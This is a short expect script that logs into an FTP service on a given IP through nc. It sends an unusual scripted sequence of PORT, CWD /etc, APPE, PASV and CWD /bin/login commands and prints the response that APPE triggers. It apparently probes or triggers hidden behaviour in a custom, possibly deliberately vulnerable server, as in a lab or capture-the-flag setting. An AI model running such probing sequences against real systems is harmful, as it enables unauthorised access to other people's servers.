#!/usr/bin/expect --
set ipaddr [lindex ${argv} 0]

set password [lindex ${argv} 1]

set timeout 5

#puts "${ipaddr}:21 ${password}"

spawn nc ${ipaddr} 21

expect "220*\r\n" {} timeout {exit 1}

send "USER ftp \r"

expect "331*\r\n" {} timeout {exit 1}

send "PASS ${password}\r"

expect "l0gged*\r\n" {} timeout {exit 1}

send "PWD\r"

expect "257*\r\n"  {} timeout {exit 1}

send "PORT ${ipaddr},4,1\r"

expect "PORT*\r\n" {} timeout {exit 1}

send "PORT ${ipaddr},12,48\r"

expect "PORT*\r\n" {} timeout {exit 1}

send "PWD\r"

expect "257*\r\n" {} timeout {exit 1}

send "CWD /etc\r"

expect "550*\r\n"  {} timeout {exit 1}

send "APPE\r"

expect -re "200 (.*)\r\n"  {puts $expect_out(1,string)} timeout {exit 1}
 
send "PASV\r"

expect "500*\r\n"  {} timeout {exit 1}

send "CWD /bin/login\r"

expect "550*\r\n"  {} timeout {exit 1}

send "PORT ${ipaddr},4,2\r"

expect "PORT*\r\n"  {} timeout {exit 1}


exit 0
